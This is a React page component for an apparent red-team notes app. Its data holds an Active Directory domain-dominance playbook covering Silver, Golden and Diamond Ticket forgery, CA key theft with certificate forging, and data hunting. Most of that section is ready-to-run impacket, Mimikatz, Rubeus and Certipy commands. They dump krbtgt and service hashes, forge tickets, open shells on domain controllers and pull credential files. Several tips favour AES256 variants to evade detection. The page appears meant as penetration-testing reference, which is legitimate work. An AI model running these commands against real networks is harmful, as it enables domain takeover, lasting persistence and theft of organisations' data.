import React, { useState } from 'react';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import DraggableCardList from '../components/DraggableCardList';
import { usePageStorage } from '../hooks/usePageStorage';
import { Plus, X } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'TICKET FORGERY',
    color: 'yellow',
    nodes: [
      { title: 'Silver Tickets', subtitle: 'Service TGS forge • NTLM hash', id: 'silver' },
      { title: 'Golden Tickets', subtitle: 'krbtgt hash • unlimited TGT forge', id: 'golden' },
      { title: 'Diamond Tickets', subtitle: 'Modify PAC • stealthier than golden', id: 'diamond' },
    ]
  },
  {
    header: 'CERT & DATA',
    color: 'green',
    nodes: [
      { title: 'Forged Certificates', subtitle: 'CA key theft • PKINIT • UnPAC', id: 'forged-certs' },
      { title: 'Data Hunting', subtitle: 'File shares • databases • docs', id: 'data-hunting' },
    ]
  },
];

const techniques = [
  {
    id: 'silver',
    title: 'Silver Tickets',
    subtitle: 'Forge a TGS ticket for a specific service using the service account\'s NTLM hash',
    tags: ['Silver Ticket', 'TGS forge', 'Mimikatz', 'Rubeus', 'impacket', 'ticketer', 'service hash'],
    accentColor: 'yellow',
    overview: 'A Silver Ticket is a forged Kerberos TGS created offline using the NTLM hash of a service account (or machine account). The KDC is never contacted — the ticket is presented directly to the target service. Scope is limited to that specific service on that specific host. The most common targets: CIFS (file access), HOST (winrs/psexec), HTTP, LDAP, MSSQL, WSMAN. Because no AS-REQ or TGS-REQ hits the DC, Silver Tickets evade many detection controls that rely on KDC event logging.',
    steps: [
      'OBTAIN HASH: get the NTLM hash of the target service account or machine account via DCSync, secretsdump, or lsadump',
      'GET DOMAIN SID: needed to construct the PAC — use whoami /user (strip last RID) or PowerView Get-DomainSID',
      'FORGE (remote): impacket ticketer.py — generates a .ccache ticket file usable directly with impacket tools from Linux',
      'FORGE (on-prem): Mimikatz kerberos::golden /service — forge and inject directly into current session with /ptt',
      'FORGE (on-prem): Rubeus silver — execute-assembly forge, /ptt injects into beacon session',
      'SERVICE TYPES: cifs (SMB shares/file access), host (winrs/psexec), http (web), ldap (AD queries), mssql, wsman (WinRM)',
      'OPSEC: tickets without corresponding AS-REQ on the DC can be detected — use with care on monitored environments',
    ],
    commands: [
      {
        title: 'Remote — impacket ticketer (from Linux)',
        code: `# ── Obtain machine account hash first ────────────────────────────────────────
# DCSync for the target computer account
impacket-secretsdump corp.local/Administrator:Password@DC01 -just-dc-user FILESERVER$
# or: secretsdump -just-dc-ntlm → note the NT hash

# ── Forge Silver Ticket with impacket ticketer ────────────────────────────────
# Requires: domain-sid, NTLM hash of service account, spn, user to impersonate
impacket-ticketer \
  -nthash <MACHINE_OR_SERVICE_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -spn cifs/fileserver.corp.local \
  Administrator
# Outputs: Administrator.ccache

# ── Use the Silver Ticket ──────────────────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache
impacket-smbexec -k -no-pass fileserver.corp.local      # CIFS
impacket-wmiexec -k -no-pass fileserver.corp.local      # WMI (host spn)
impacket-psexec  -k -no-pass fileserver.corp.local      # PSExec (host spn)

# LDAP Silver Ticket (for AD queries as DA)
impacket-ticketer \
  -nthash <DC_MACHINE_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -spn ldap/DC01.corp.local \
  Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc  # DCSync via LDAP ticket

# MSSQL Silver Ticket
impacket-ticketer \
  -nthash <SQL_SVC_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -spn MSSQLSvc/SQL01.corp.local:1433 \
  Administrator
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass SQL01.corp.local`
      },
      {
        title: 'On-Prem — Mimikatz & Rubeus (from beacon)',
        code: `# ── Step 1: Get machine account hash via DCSync ──────────────────────────────
mimikatz lsadump::dcsync /domain:corp.local /user:FILESERVER$
# Note: NTLM hash from "Hash NTLM:" line

# ── Step 2a: Forge and inject with Mimikatz ───────────────────────────────────
# Note: mimikatz uses kerberos::golden for both Golden AND Silver tickets
mimikatz kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /rc4:<MACHINE_NTLM_HASH> \
  /target:fileserver.corp.local \
  /service:cifs \
  /ptt
# /service options: cifs, host, rpcss, http, ldap, mssql, wsman, krbtgt

# Export to file (for later use)
mimikatz kerberos::golden \
  /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /rc4:<HASH> /target:fileserver.corp.local /service:cifs \
  /ticket:silver_cifs.kirbi

# ── Step 2b: Forge with Rubeus ────────────────────────────────────────────────
execute-assembly /tools/Rubeus.exe silver \
  /service:cifs/fileserver.corp.local \
  /rc4:<MACHINE_NTLM_HASH> \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /ptt /nowrap

# HOST SPN — enables winrs/psexec
execute-assembly /tools/Rubeus.exe silver \
  /service:host/fileserver.corp.local \
  /rc4:<MACHINE_NTLM_HASH> \
  /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /ptt /nowrap

# ── Step 3: Use the Silver Ticket ────────────────────────────────────────────
execute-assembly /tools/Rubeus.exe klist
ls \\fileserver.corp.local\C$                 # CIFS
winrs -r:fileserver.corp.local cmd            # HOST
shell dir \\fileserver.corp.local\C$

# Get domain SID (if unknown)
Get-DomainSID                                 # PowerView
(whoami /user) -split "-" | select -SkipLast 1 | Join-String -Separator "-"`
      }
    ]
  },
  {
    id: 'golden',
    title: 'Golden Tickets',
    subtitle: 'Forge TGTs using the krbtgt hash to impersonate any user in the domain',
    tags: ['Golden Ticket', 'krbtgt', 'TGT forge', 'Mimikatz', 'Rubeus', 'impacket ticketer', 'persistence'],
    accentColor: 'yellow',
    overview: 'Golden Tickets are forged Kerberos TGTs signed with the krbtgt account\'s NTLM hash. A valid-looking TGT can request tickets for any service as any user with arbitrary group memberships. The ticket can have a 10-year validity and survives all password changes (except krbtgt rotation × 2). Impacket ticketer generates a .ccache file usable immediately from Linux; Mimikatz and Rubeus inject directly into the Windows session. The AES256 variant is harder to detect than RC4.',
    steps: [
      'OBTAIN krbtgt HASH: DCSync the krbtgt account — requires DA or replication rights; impacket-secretsdump or Rubeus dcsync',
      'FORGE (remote): impacket ticketer.py with -nthash of krbtgt and no -spn — produces a ccache TGT usable with all impacket tools',
      'FORGE (on-prem): Mimikatz kerberos::golden — forge and /ptt directly into current process; or save to .kirbi for later',
      'FORGE (on-prem): Rubeus golden — execute-assembly, outputs base64 ticket; inject with /ptt or save with /outfile',
      'GROUP MEMBERSHIP: specify arbitrary RIDs (512=DA, 519=EA, 518=Schema Admin) — ticket carries them in the PAC',
      'AES256 variant: /aes256: instead of /rc4: — harder to detect (RC4 Golden Tickets are flagged by some SIEM rules)',
      'INVALIDATION: requires rotating krbtgt password TWICE (once is insufficient — old key still valid during replication window)',
    ],
    commands: [
      {
        title: 'Remote — impacket ticketer + secretsdump (from Linux)',
        code: `# ── Step 1: Dump krbtgt hash ─────────────────────────────────────────────────
impacket-secretsdump corp.local/Administrator:Password@DC01 -just-dc-user krbtgt
# Note the NT hash and AES256 key from output

# ── Step 2: Forge Golden Ticket (ccache format) ────────────────────────────────
# With NT hash (RC4)
impacket-ticketer \
  -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  Administrator
# Outputs: Administrator.ccache

# With AES256 key (stealthier)
impacket-ticketer \
  -aesKey <KRBTGT_AES256_KEY> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  Administrator

# Custom group memberships in PAC
impacket-ticketer \
  -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -groups 512,513,518,519,520 \
  FakeAdmin
# 512=DA, 513=Domain Users, 518=Schema Admins, 519=Enterprise Admins, 520=GPO Creators

# ── Step 3: Use the Golden Ticket ────────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache

impacket-psexec -k -no-pass DC01.corp.local           # Shell on DC
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc  # DCSync all hashes
impacket-wmiexec -k -no-pass DC01.corp.local          # WMI shell
nxc smb DC01.corp.local -k --use-kcache               # netexec Kerberos auth`
      },
      {
        title: 'On-Prem — Mimikatz & Rubeus (from beacon)',
        code: `# ── Step 1: DCSync krbtgt hash ───────────────────────────────────────────────
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
# Capture: "Hash NTLM:" and "* Kerberos AES256" values

# Also via Rubeus (no mimikatz process needed)
execute-assembly /tools/Rubeus.exe dcsync /domain:corp.local /user:krbtgt /dc:DC01.corp.local /nowrap

# ── Step 2a: Mimikatz — forge and inject ─────────────────────────────────────
# RC4 (NTLM hash) — simpler but detectable
mimikatz kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /krbtgt:<KRBTGT_NTLM_HASH> \
  /ptt

# AES256 (stealthier — preferred in monitored environments)
mimikatz kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /aes256:<KRBTGT_AES256_KEY> \
  /ptt

# With extra group memberships (EA = 519 for cross-domain)
mimikatz kerberos::golden \
  /user:FakeAdmin \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /krbtgt:<KRBTGT_NTLM_HASH> \
  /groups:512,513,518,519,520 \
  /ptt

# Export to .kirbi (for persistence / later import)
mimikatz kerberos::golden \
  /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /krbtgt:<HASH> /ticket:golden.kirbi

# ── Step 2b: Rubeus — forge and inject ───────────────────────────────────────
execute-assembly /tools/Rubeus.exe golden \
  /rc4:<KRBTGT_NTLM_HASH> \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-<DOMAIN-SID> \
  /groups:512 \
  /ptt /nowrap

# ── Step 3: Use the Golden Ticket ────────────────────────────────────────────
execute-assembly /tools/Rubeus.exe klist
ls \\DC01.corp.local\C$
mimikatz lsadump::dcsync /domain:corp.local /user:Administrator`
      }
    ]
  },
  {
    id: 'diamond',
    title: 'Diamond Tickets',
    subtitle: 'Modify a real TGT\'s PAC — stealthier alternative to Golden Tickets',
    tags: ['Diamond Ticket', 'PAC', 'Rubeus', 'impacket', 'ticketer', 'legitimate TGT', 'stealthy persistence'],
    accentColor: 'yellow',
    overview: 'Diamond Tickets improve on Golden Tickets by starting with a legitimately KDC-issued TGT and modifying only its PAC (Privilege Attribute Certificate) to add privileged group memberships, then re-signing with the krbtgt key. The resulting ticket has a valid logon time, real KDC-issued structure, and correct key usage — defeating anomaly detection that compares ticket metadata against expected login events. Rubeus diamond handles this fully on-prem; impacket ticketer with the -old-pac flag achieves the same effect remotely.',
    steps: [
      'WHY DIAMOND: Golden Tickets are fully synthetic — anomaly detection can flag tickets with no matching AS-REQ on the DC; Diamond Tickets start with a real TGT',
      'MECHANISM: request a real TGT for a low-priv user → decrypt the PAC using krbtgt key → add privileged group RIDs → re-sign → re-encrypt → use',
      'FORGE (remote): impacket ticketer with -request flag — requests real TGT from KDC then modifies its PAC from Linux',
      'FORGE (on-prem): Rubeus diamond /tgtdeleg — uses S4U2Self delegation to get a base TGT without admin rights, then modifies PAC',
      'FORGE (on-prem): Rubeus diamond /user /password — authenticates as the target user to get real TGT, then elevates PAC',
      'GROUP RIDS: 512=Domain Admins, 519=Enterprise Admins, 518=Schema Admins — add any combination to the PAC',
      'DETECTION: still requires the krbtgt AES256/RC4 key; the real AS-REQ shows on DC logs but as the low-priv user — PAC changes are not logged',
    ],
    commands: [
      {
        title: 'Remote — impacket ticketer with real TGT base (from Linux)',
        code: `# ── Obtain krbtgt hash first (same as Golden Ticket) ─────────────────────────
impacket-secretsdump corp.local/Administrator:Password@DC01 -just-dc-user krbtgt

# ── Diamond Ticket via impacket ticketer ──────────────────────────────────────
# The -request flag causes ticketer to first request a real TGT from the KDC,
# then modify its PAC to include the specified groups — stealthier than pure forgery

impacket-ticketer \
  -request \
  -user lowpriv \
  -password LowPrivPass \
  -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -groups 512,519 \
  Administrator
# Outputs: Administrator.ccache (PAC-modified real TGT)

# With AES256 (stealthier)
impacket-ticketer \
  -request \
  -user lowpriv \
  -password LowPrivPass \
  -aesKey <KRBTGT_AES256_KEY> \
  -domain-sid S-1-5-21-<DOMAIN-SID> \
  -domain corp.local \
  -groups 512,519 \
  Administrator

# ── Use the Diamond Ticket ─────────────────────────────────────────────────────
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DC01.corp.local
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc
nxc smb DC01.corp.local -k --use-kcache`
      },
      {
        title: 'On-Prem — Rubeus diamond (from beacon)',
        code: `# ── Method 1: tgtdeleg (no plaintext creds needed for base TGT) ──────────────
# Step 1: Capture a real TGT via S4U2Self delegation (works from any user context)
execute-assembly /tools/Rubeus.exe tgtdeleg /nowrap
# Outputs: base64 TGT of current user — valid, KDC-issued

# Step 2: Forge Diamond Ticket — modify PAC of the real TGT + re-sign with krbtgt
execute-assembly /tools/Rubeus.exe diamond \
  /tgtdeleg \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512,519 \
  /krbkey:<KRBTGT_AES256_KEY> \
  /domain:corp.local \
  /dc:DC01.corp.local \
  /ptt /nowrap
# /krbkey: use AES256 (stealthier) — or /rc4: for NTLM hash

# ── Method 2: user + password (authenticates as target, modifies own PAC) ─────
execute-assembly /tools/Rubeus.exe diamond \
  /user:lowpriv \
  /password:LowPrivPass \
  /enctype:aes256 \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:512,519 \
  /krbkey:<KRBTGT_AES256_KEY> \
  /domain:corp.local \
  /dc:DC01.corp.local \
  /ptt /nowrap

# ── Verify and use ────────────────────────────────────────────────────────────
execute-assembly /tools/Rubeus.exe klist
ls \\DC01.corp.local\C$
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt`
      }
    ]
  },
  {
    id: 'forged-certs',
    title: 'Forged Certificates — CA Key Theft & Persistence',
    subtitle: 'Steal the CA private key to forge certificates for any user indefinitely',
    tags: ['CA key theft', 'PKINIT', 'UnPAC-the-hash', 'Certipy', 'forged cert', 'golden cert'],
    accentColor: 'green',
    overview: 'Stealing the Certificate Authority\'s private key allows forging certificates for any user in the domain indefinitely — a persistence mechanism that survives krbtgt rotation, password resets, and DC rebuilds. Forged certificates are cryptographically valid and issued by the trusted CA. PKINIT authentication with a forged certificate yields both a TGT and (via UnPAC-the-Hash) the target account\'s NT hash. Certipy automates both the CA key backup and certificate forging from Linux.',
    steps: [
      'If you compromise the CA server, steal the CA private key and certificate — forge certs for any user',
      'Forged certificates are valid even after password changes and are nearly impossible to detect',
      'CA key theft: use SharpDPAPI or Certipy on the CA server to extract the private key',
      'Forge a certificate for any user (e.g., Domain Admin) using the stolen CA key',
      'UnPAC-the-Hash: request a TGT via PKINIT with a cert, then use U2U to get the NT hash from the PAC',
      'The stolen CA key provides persistent access even after krbtgt rotation',
    ],
    commands: [
      {
        title: 'CA key theft and certificate forging',
        code: `# Step 1: Extract CA private key (on CA server as local admin)
# Certipy (Linux — from a remote DA session)
certipy ca -backup -ca "CORP-CA" -u Administrator@corp.local -p Password -target CA.corp.local
# Outputs: CORP-CA.pfx

# SharpDPAPI (Windows — on CA server)
execute-assembly /path/to/SharpDPAPI.exe certificates /machine /server:CA.corp.local

# Step 2: Forge certificate for Domain Admin
certipy forge -ca-pfx CORP-CA.pfx -upn Administrator@corp.local -subject "CN=Administrator"
# Outputs: administrator_forged.pfx

# Step 3: Authenticate with forged cert (get TGT + NT hash)
certipy auth -pfx administrator_forged.pfx -domain corp.local -dc-ip DC01
# Outputs: TGT + NT hash of Administrator

# UnPAC-the-Hash (get NT hash via PKINIT)
execute-assembly /path/to/Rubeus.exe asktgt /user:Administrator /certificate:<BASE64_PFX> /password:certpass /getcredentials /nowrap /domain:corp.local
# /getcredentials: uses U2U to extract NT hash from PAC

# Use NT hash or TGT
impacket-psexec -hashes :NT_HASH CORP/Administrator@DC01`
      }
    ]
  },
  {
    id: 'data-hunting',
    title: 'Data Hunting & Exfiltration',
    subtitle: 'Find and extract sensitive data from file shares, databases, and endpoints',
    tags: ['Snaffler', 'file shares', 'databases', 'credentials', 'data hunting', 'exfil'],
    accentColor: 'green',
    overview: 'Data hunting identifies the sensitive information that justifies the attack path — credentials, private keys, PII, financial data, and intellectual property. Snaffler automatically crawls all accessible file shares and scores findings by sensitivity (credentials, private keys, connection strings). MailSniper searches Exchange/O365 mailboxes for keywords across the entire organisation with admin impersonation rights. Documenting this evidence demonstrates real business impact in the final report.',
    steps: [
      'Snaffler: automated sensitive file discovery across accessible file shares — find passwords, keys, configs',
      'Enumerate all accessible file shares in the domain',
      'Hunt for: password files, config files with credentials, private keys, AWS/Azure creds, source code',
      'Database access: query MSSQL for sensitive tables (users, passwords, PII)',
      'Email harvest: use MailSniper to search Exchange/O365 for keywords across the org',
      'Document evidence: collect files that demonstrate the business impact of the engagement',
    ],
    commands: [
      {
        title: 'Data hunting with Snaffler and share enumeration',
        code: `# Snaffler — automated sensitive file discovery
execute-assembly /path/to/Snaffler.exe -s -o snaffler_output.txt
# Automatically finds: credentials, config files, private keys, connection strings
# Across all accessible shares in the domain

# Manual share enumeration
shell net view /domain:corp.local
Invoke-ShareFinder -Verbose -CheckShareAccess   # PowerView

# Search file shares for keywords
shell findstr /si password \\fileserver\share\*.txt \\fileserver\share\*.xml \\fileserver\share\*.config
shell dir \\fileserver\share /s /b | findstr -i "password pass cred secret key"

# Database enumeration
# After xp_cmdshell access:
SELECT name FROM sys.databases
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%password%'
SELECT TOP 100 * FROM Users

# Email search with MailSniper
Import-Module MailSniper.ps1
Invoke-GlobalMailSearch -ImpersonationAccount administrator -ExchHostname mail.corp.local -OutputCsv results.csv
Find-MailboxDelegates -ExchHostname mail.corp.local | Where-Object { $_.User -match "admin" }

# Download identified files via beacon
download \\fileserver\share\config\web.config
download \\fileserver\share\IT\credentials.xlsx`
      }
    ]
  },
];

const colorOptions = [
  { value: 'cyan', name: 'Cyan' },{ value: 'green', name: 'Green' },{ value: 'red', name: 'Red' },{ value: 'purple', name: 'Purple' },
  { value: 'orange', name: 'Orange' },{ value: 'pink', name: 'Pink' },{ value: 'blue', name: 'Blue' },{ value: 'yellow', name: 'Yellow' },
];
const colorPreview = { cyan:'bg-cyan-500', green:'bg-emerald-500', red:'bg-red-500', purple:'bg-purple-500', orange:'bg-orange-500', pink:'bg-pink-500', blue:'bg-blue-500', yellow:'bg-yellow-500' };
const headerColorMap = { cyan:'text-cyan-400 border-cyan-500/30', green:'text-emerald-400 border-emerald-500/30', red:'text-red-400 border-red-500/30', purple:'text-purple-400 border-purple-500/30', orange:'text-orange-400 border-orange-500/30', pink:'text-pink-400 border-pink-500/30', blue:'text-blue-400 border-blue-500/30', yellow:'text-yellow-400 border-yellow-500/30' };

export default function DomainDominance() {
  const { columns, setColumns, allCards, addCustomCard, updateCard, deleteCard, reorderCards } = usePageStorage('domaindominance', initialMapColumns, techniques);
  const [modalStep, setModalStep] = useState(null);
  const [columnName, setColumnName] = useState('');
  const [selectedColor, setSelectedColor] = useState('cyan');
  const [addingTopicCol, setAddingTopicCol] = useState(null);
  const [topicTitle, setTopicTitle] = useState('');
  const [topicTags, setTopicTags] = useState('');
  const [cardModalOpen, setCardModalOpen] = useState(false);
  const [editingCard, setEditingCard] = useState(null);
  const handleCardSubmit = (card) => { if (editingCard) { updateCard(card); setEditingCard(null); } else addCustomCard(card); };

  const handleAddColumnStart = () => setModalStep('name');
  const handleNameSubmit = () => { if (columnName.trim()) setModalStep('color'); };
  const handleColorSubmit = () => { setColumns([...columns, { header: columnName.toUpperCase(), color: selectedColor, nodes: [] }]); setModalStep(null); setSelectedColor('cyan'); setColumnName(''); };
  const handleDeleteColumn = (i) => setColumns(columns.filter((_, idx) => idx !== i));
  const handleAddTopic = (colIndex) => {
    if (topicTitle.trim()) {
      const updated = [...columns];
      updated[colIndex].nodes.push({ title: topicTitle, subtitle: 'Add details here', tags: topicTags.split(',').map(t => t.trim()).filter(t => t) });
      setColumns(updated); setAddingTopicCol(null); setTopicTitle(''); setTopicTags('');
    }
  };
  const handleDeleteTopic = (colIndex, nodeIndex) => { const updated = [...columns]; updated[colIndex].nodes.splice(nodeIndex, 1); setColumns(updated); };
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };

  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Domain </span><span className="text-emerald-400">Dominance</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Silver/Golden/Diamond Tickets • Forged Certificates • Data Hunting</p>
      </div>

      <div className="overflow-x-auto pb-4">
        <div className="inline-flex gap-4 min-w-max">
          {columns.map((col, i) => {
            const color = col.color || 'cyan';
            return (
              <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
                <div className={`text-center py-2 border-b-2 mb-2 ${headerColorMap[color]} flex items-center justify-between px-2`}>
                  <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">{col.header}</span>
                  <button onClick={() => handleDeleteColumn(i)} className="text-slate-500 hover:text-slate-300 transition-colors p-0.5"><X className="w-3 h-3" /></button>
                </div>
                <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
                  {col.nodes.map((node, j) => (
                    <div key={j} className="flex items-start gap-1 group">
                      <div className="flex-1 min-w-0">
                        <MapNode title={node.title} subtitle={node.tags && node.tags.length > 0 ? node.tags.join(' • ') : node.subtitle} accentColor={color} onClick={() => scrollTo(node.id)} small />
                      </div>
                      <button onClick={() => handleDeleteTopic(i, j)} className="text-slate-600 hover:text-red-400 transition-colors p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"><X className="w-3 h-3" /></button>
                    </div>
                  ))}
                  {addingTopicCol === i ? (
                    <div className="flex flex-col gap-1">
                      <input type="text" value={topicTitle} onChange={e => setTopicTitle(e.target.value)} placeholder="Topic name" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500" autoFocus onKeyDown={e => { if (e.key === 'Escape') { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); } }} />
                      <input type="text" value={topicTags} onChange={e => setTopicTags(e.target.value)} placeholder="Tags (comma-separated)" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500" onKeyDown={e => { if (e.key === 'Enter') handleAddTopic(i); if (e.key === 'Escape') { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); } }} />
                      <div className="flex gap-1">
                        <button onClick={() => handleAddTopic(i)} className="flex-1 px-2 py-1 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-mono rounded transition-colors">Add</button>
                        <button onClick={() => { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); }} className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded transition-colors">Cancel</button>
                      </div>
                    </div>
                  ) : (
                    <button onClick={() => setAddingTopicCol(i)} className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500 transition-colors">+ Add Topic</button>
                  )}
                </div>
              </div>
            );
          })}
          <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]">
            <button onClick={handleAddColumnStart} className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20 transition-all">
              <Plus className="w-6 h-6 text-slate-500" /><span className="text-xs font-mono text-slate-500 text-center">Add Column</span>
            </button>
          </div>
        </div>
      </div>

      {modalStep && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
            {modalStep === 'name' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3>
                <input type="text" value={columnName} onChange={e => setColumnName(e.target.value)} placeholder="e.g., Custom Category" className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-slate-500" autoFocus onKeyDown={e => e.key === 'Enter' && handleNameSubmit()} />
                <div className="flex gap-2">
                  <button onClick={() => setModalStep(null)} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm">Cancel</button>
                  <button onClick={handleNameSubmit} className="flex-1 px-4 py-2 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-colors font-mono text-sm font-semibold">Next</button>
                </div>
              </div>
            )}
            {modalStep === 'color' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3>
                <div className="flex flex-col gap-2 max-h-64 overflow-y-auto">
                  {colorOptions.map(option => (
                    <button key={option.value} onClick={() => setSelectedColor(option.value)} className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold transition-all flex items-center gap-2 ${selectedColor === option.value ? `${colorPreview[option.value]} text-slate-900` : 'bg-slate-800 text-slate-300 hover:bg-slate-700'}`}>
                      <div className={`w-3 h-3 rounded-full ${colorPreview[option.value]}`} />{option.name}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2">
                  <button onClick={() => setModalStep('name')} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm">Back</button>
                  <button onClick={handleColorSubmit} className="flex-1 px-4 py-2 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-colors font-mono text-sm font-semibold">Create</button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      <div className="flex items-center justify-between pt-4">
        <button onClick={() => setCardModalOpen(true)} className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-mono rounded transition-colors flex items-center gap-1">
          <Plus className="w-3 h-3" /> Add Technique
        </button>
      </div>
      <AddCardModal isOpen={cardModalOpen || !!editingCard} onClose={() => { setCardModalOpen(false); setEditingCard(null); }} onSubmit={handleCardSubmit} editCard={editingCard} />
      <div className="border-t border-slate-800/50 pt-10">
        <DraggableCardList cards={allCards} onDelete={deleteCard} onReorder={reorderCards} onEdit={(card) => setEditingCard(card)} />
      </div>
    </div>
  );
}